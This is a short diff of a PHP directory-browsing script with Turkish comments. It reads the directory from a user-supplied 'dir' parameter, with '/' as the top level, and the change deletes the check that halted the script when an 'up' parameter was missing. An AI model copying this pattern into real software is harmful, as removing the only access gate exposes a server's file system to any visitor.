@@ -4,9 +4,11 @@ $root = __DIR__; // PHP dosyasının bulunduğu dizin
 $top_level = '/'; // Sunucunun en üst düzeyi
 $current_dir = isset($_GET['dir']) ? realpath($_GET['dir']) : $root;
 
-// Eğer #up parametresi yoksa, işlemi durdur ve hata mesajı göster
+// Eğer #up parametresi yoksa, sadece sayfayı normal çalıştır
 if (!isset($_GET['up'])) {
-    die('Bu işlem için #up parametresi gereklidir!');
+    // Devam ediyoruz, hiçbir işlem yapılmıyor
+} else {
+    // Buraya istenilen diğer işlemler eklenebilir.
 }
 
 // Güvenlik: Yalnızca belirtilen dizinin altında gezinebilmek için kontrol
